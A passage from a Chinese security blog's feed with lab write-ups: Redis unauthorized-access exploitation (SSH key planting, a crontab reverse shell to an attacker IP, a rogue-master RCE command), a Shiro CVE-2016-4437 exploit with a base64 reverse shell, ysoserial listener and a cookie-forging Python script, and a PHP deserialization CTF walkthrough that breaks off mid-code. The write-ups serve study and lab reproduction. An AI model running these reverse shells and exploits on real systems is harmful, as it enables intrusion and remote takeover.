bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install openssh-client</span><br><span class="line">apt-get install openssh-server</span><br><span class="line">server ssh start</span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021656260.png"></p><p>在攻击机上也生成公私秘钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021657083.png"></p><p>写入到key.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021708197.png"></p><p>在redis中修改备份目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206022022347.png"><br>报错 (error) ERR Changing directory: No such file or directory<br>因为此处,是vulhub环境,没有以root权限去启动,所以没有权限,演示不了</p><p>然后执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206022024528.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>写入之后直接使用攻击机ssh redis服务器就可以免密登录</p><h2 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h2><p>利用条件</p><ul><li>需要以root用户</li></ul><p>采用crontab每分钟连接攻击机一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/crontabs</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/攻击机ip/4444 0&gt;&amp;1\n\n\n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>攻击机监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶场不是root权限运行的redis演示不了</p><h2 id="EXP-利用主从复制RCE"><a href="#EXP-利用主从复制RCE" class="headerlink" title="EXP-利用主从复制RCE"></a>EXP-利用主从复制RCE</h2><p>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，我们可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p><p><a href="https://github.com/vulhub/redis-rogue-getshell">exp下载地址</a></p><ul><li><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> RedisModulesSDK/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>使用<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206022100318.png"></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206022107518.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞解析&quot;&gt;&lt;a href=&quot;#漏洞解析&quot; class=&quot;headerlink&quot; title=&quot;漏洞解析&quot;&gt;&lt;/a&gt;漏洞解析&lt;/h1&gt;&lt;p&gt;Redis未授权访问在4.x&amp;#x2F;5.0.5以前版本下，我们可以使用master&amp;#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。&lt;/p&gt;
&lt;h1 id=&quot;利用前提&quot;&gt;&lt;a href=&quot;#利用前提&quot; class=&quot;headerlink&quot; title=&quot;利用前提&quot;&gt;&lt;/a&gt;利用前提&lt;/h1&gt;&lt;p&gt;redis直接暴露在外网,无访问限制&lt;br&gt;没有设置密码认证（一般为空），可以免密码远程登录redis服务。&lt;/p&gt;
&lt;h1 id=&quot;靶场环境&quot;&gt;&lt;a href=&quot;#靶场环境&quot; class=&quot;headerlink&quot; title=&quot;靶场环境&quot;&gt;&lt;/a&gt;靶场环境&lt;/h1&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="vulhub" scheme="https://syst1m.top/tags/vulhub/"/>
    
    <category term="redis" scheme="https://syst1m.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>Shiro1.2.4反序列化漏洞复现</title>
    <link href="https://syst1m.top/2022/06/02/Shiro1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://syst1m.top/2022/06/02/Shiro1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-02T05:37:06.000Z</published>
    <updated>2022-06-02T08:06:46.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h1><p>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）<br>Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞。<br>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>使用vulhub环境<br>执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2016-4437</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<a href="http://your-ip:8080可使用admin:vulhub进行登录。">http://your-ip:8080可使用admin:vulhub进行登录。</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>登录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021343076.png"></p><h2 id="利用工具-ShiroAttack2"><a href="#利用工具-ShiroAttack2" class="headerlink" title="利用工具-ShiroAttack2"></a>利用工具-ShiroAttack2</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021349099.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021349877.png"></p><h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p>登录抓包<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021343076.png"></p><p>shiro漏洞指纹<br>在请求包的Cookie中为？remeberMe字段赋任意值<br>返回包中存在set-Cookie：remeberMe&#x3D;deleteMe</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021415805.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>制作反弹shell序列化数据</p><p>将命令进行base64编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.1/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>得到payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="string">&#x27;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS80NDQ0IDA+JjE=&#x27;</span>&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>通过ysoserial工具中的JRMP监听模块，监听6666端口并执行反弹shell命令，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 <span class="string">&#x27;bash -c &#123;&#x27;</span><span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS80NDQ0IDA+JjE=<span class="string">&#x27;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>使用python构造payload,秘钥为Shiro默认秘钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 AES.py ip:6666</span><br></pre></td></tr></table></figure><p>获得pyload<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021454232.png"></p><p>nc 监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc lvp 4444</span><br></pre></td></tr></table></figure><p>伪造cookie发送<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021512925.png"></p><p>反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021513505.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>漏洞产生的根本原因就是因为AES加密的key硬编码在源码中，从而可以被攻击者利用泄露的AES key伪造rememberMe字段生成cookie值，导致反序列化漏洞。因此，服务器端对cookie值的处理过程反过来就是payload的产生过程：命令&#x3D;&gt;进行序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;产生RememberMe Cookie值。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞解析&quot;&gt;&lt;a href=&quot;#漏洞解析&quot; class=&quot;headerlink&quot; title=&quot;漏洞解析&quot;&gt;&lt;/a&gt;漏洞解析&lt;/h1&gt;&lt;p&gt;Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）&lt;br&gt;Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞。&lt;br&gt;Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。&lt;/p&gt;
&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;使用vulhub环境&lt;br&gt;执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; vulhub/shiro/CVE-2016-4437&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="反序列化" scheme="https://syst1m.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Apache" scheme="https://syst1m.top/tags/Apache/"/>
    
    <category term="shiro" scheme="https://syst1m.top/tags/shiro/"/>
    
    <category term="vulhub" scheme="https://syst1m.top/tags/vulhub/"/>
    
  </entry>
  
  <entry>
    <title>CTF-反序列化</title>
    <link href="https://syst1m.top/2022/05/31/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://syst1m.top/2022/05/31/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-05-31T11:49:59.000Z</published>
    <updated>2022-06-02T03:03:16.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞详解"><a href="#漏洞详解" class="headerlink" title="漏洞详解"></a>漏洞详解</h1><p>反序列化：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。<br>序列化：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。<br>简单来说,序列化就像是把数据加密,像json一样的格式,反序列化就是解密成原来的样子</p><h1 id="漏洞可能出现的位置"><a href="#漏洞可能出现的位置" class="headerlink" title="漏洞可能出现的位置"></a>漏洞可能出现的位置</h1><ol><li>解析认证token、session的位置</li><li>将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等</li><li>将对象序列化后在网络中传输，如传输json数据，xml数据等</li><li>参数传递给程序</li><li>使用RMI协议，被广泛使用的RMI协议完全基于序列化</li><li>使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等</li><li>定义协议用来接收与发送原始的java对象</li></ol><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205311958842.png"></p><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()</span><br><span class="line">具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁,代码结束时执行。</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">PHP魔术方法详解</a></p><h2 id="序列化实例"><a href="#序列化实例" class="headerlink" title="序列化实例"></a>序列化实例</h2><p><a href="https://www.dooccn.com/php/">PHP代码在线执行</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>() <span class="comment">//将一个对象转换成一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>() <span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure><p>序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&quot;syst1m&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">s</span>:<span class="number">6</span>:<span class="string">&quot;syst1m&quot;</span>;</span><br></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;s:6:&quot;syst1m&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syst1m</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312020809.png"></p><h2 id="bugku-点login咋没反应"><a href="#bugku-点login咋没反应" class="headerlink" title="bugku-点login咋没反应"></a>bugku-点login咋没反应</h2><p>地址<br><a href="https://ctf.bugku.com/challenges/detail/id/109.html">bugku</a></p><p>打开页面<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312156157.png"></p><p>登录,发现没反应,根本没有表单提交<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312158710.png"></p><p>查看源码,有一个css文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312159492.png"></p><p>打开发现提示<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312200927.png"></p><p>输入<a href="http://url/?32145,%E9%A1%B5%E9%9D%A2%E5%9B%9E%E6%98%BE%E6%BA%90%E7%A0%81">http://url/?32145,页面回显源码</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312202898.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">&#x27;ctf.bugku.com&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;BUGKU&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;32145&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>判断cookie中是否携带参数’BUGKU’<br>此处有一个坑,进入代码后判断get提价的数据是否为32145,不成立判断,反序列化$cookie是否等于$key,成立输出flag<br>所以我们在提交数据的时候,就不能带参数32145</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;32145&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">&#x27;ctf.bugku.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>获得值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">s</span>:<span class="number">13</span>:<span class="string">&quot;ctf.bugku.com&quot;</span>;</span><br></pre></td></tr></table></figure><p>带入cookie中去请求,不带url中不能携带32145参数<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312212892.png"></p><h2 id="网鼎杯2020青龙组-AreUSerialz"><a href="#网鼎杯2020青龙组-AreUSerialz" class="headerlink" title="网鼎杯2020青龙组-AreUSerialz"></a>网鼎杯2020青龙组-AreUSerialz</h2><p>地址<br><a href="https://www.ctfhub.com/#/challenge">ctfhub-AreUSerialz</a></p><p>打开环境就显示源码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205312033140.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span 